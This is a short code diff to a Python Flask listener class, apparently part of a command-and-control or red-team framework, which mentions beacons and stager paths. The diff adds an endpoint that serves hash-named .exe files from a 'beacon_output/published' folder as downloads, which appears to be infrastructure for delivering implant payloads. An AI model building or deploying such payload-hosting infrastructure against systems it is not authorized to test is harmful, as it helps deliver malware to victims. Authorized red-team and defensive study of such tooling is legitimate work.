@@ -15,7 +15,7 @@ import threading
 import time
 from typing import Optional
 
-from flask import Flask, Response, jsonify, request
+from flask import Flask, Response, jsonify, request, send_file
 
 import base64 as _b64
 import json
@@ -635,6 +635,22 @@ class BeaconListener(Transport):
                 self._print_beacon(
                     f"[BEACON] could not register stager path "
                     f"{spath!r}: {exc}")
+
+        @app.route('/published/<name>', methods=['GET'])
+        def published(name):
+            import re as _re
+            import os as _os
+            if not _re.fullmatch(r'[0-9a-f]{64}\.exe', name):
+                return Response(status=404)
+            base = _os.path.join(
+                _os.path.dirname(_os.path.dirname(
+                    _os.path.abspath(__file__))), 'beacon_output',
+                'published')
+            path = _os.path.join(base, name)
+            if not _os.path.isfile(path):
+                return Response(status=404)
+            return send_file(path, mimetype='application/octet-stream',
+                             as_attachment=True, download_name=name)
 
         @app.route('/health', methods=['GET'])
         def health():
